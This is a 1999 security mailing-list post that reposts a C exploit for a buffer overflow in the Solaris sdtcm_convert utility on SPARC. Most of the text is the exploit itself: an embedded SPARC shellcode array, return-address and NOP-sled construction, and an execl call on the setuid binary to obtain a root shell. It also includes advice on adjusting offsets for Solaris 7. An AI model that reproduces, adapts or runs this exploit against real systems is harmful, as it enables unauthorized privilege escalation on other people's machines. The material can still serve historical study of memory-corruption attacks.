
/*
[ http://www.rootshell.com/ ]

Date: Wed, 2 Jun 1999 16:12:56 +0100
From: acpizer <acpizer@MACH.UNSEEN.ORG>
Subject: Solaris 7/SPARC and sdtcm_convert.

Good day,

 I did a quick search and didn't see this exploit code anywhere on bugtraq,
 this exploit was written by the same person who wrote the solaris libc
 exploit, again this time the epxloit is said to work on both Solaris 2.6
 and 7, but he autho fails to provide offsets for Solaris 7.

 change the '#define     ADJUST      2' value to 1 for Solaris .

-- snip --
*/
/*=============================================================================
   sdtcm_convert Overflow Exploits( for Sparc Edition)
   The Shadow Penguin Security (http://base.oc.to:/skyscraper/byte/551)
   Written by UNYUN (unewn4th@usa.net)

   [usage]
        % gcc ex_sdtcm_convert.c (This example program)
        % a.out
        If no response, hit ctrl+c
        #

 ============================================================================
*/

#define     ADJUST      1
#define     OFFSET1     4000
#define     LENGTH1     260
#define     OFFSET2     6000
#define     LENGTH2     1000
#define     OFFSET3     6000+16*30

#define NOP 0xa61cc013

char exploit_code[] =
"\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff";

unsigned long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

unsigned long ret_adr;
int i;

main()
{
    static char x[11000];

    memset(x,'a',10000);
    ret_adr=get_sp()-6300;
    for (i = 0; i < 5000 ; i+=4){
        x[i+3]=ret_adr & 0xff;
        x[i+2]=(ret_adr >> 8 ) &0xff;
        x[i+1]=(ret_adr >> 16 ) &0xff;
        x[i+0]=(ret_adr >> 24 ) &0xff;
    }
    ret_adr=get_sp() - 10200;
    if ((ret_adr & 0xff )==0) ret_adr+=4;
    printf("%lx\n",ret_adr);
    for (i = OFFSET1+ADJUST; i < OFFSET1+LENGTH1 ; i+=4){
        x[i+3]=ret_adr & 0xff;
        x[i+2]=(ret_adr >> 8 ) &0xff;
        x[i+1]=(ret_adr >> 16 ) &0xff;
        x[i+0]=(ret_adr >> 24 ) &0xff;
    }
    for (i = OFFSET2+ADJUST; i < OFFSET2+LENGTH2 ; i+=4){
        x[i+3]=NOP & 0xff;
        x[i+2]=(NOP >> 8 ) &0xff;
        x[i+1]=(NOP >> 16 ) &0xff;
        x[i+0]=(NOP >> 24 ) &0xff;
    }
    for (i=0;i<strlen(exploit_code);i++)
x[OFFSET3+ADJUST+i]=exploit_code[i];
    x[10000]=0;
    execl("/usr/dt/bin/sdtcm_convert", "sdtcm_convert",
"-d",x,"odedn",(char *) 0);
}

/*
-- snip --

 Cheers,
        acpizer.


-------------------------------------------------------------------------------
"Probably you've only really grown up, when you can bear not being understood."

                              Marian Gold /Alphaville
			      */
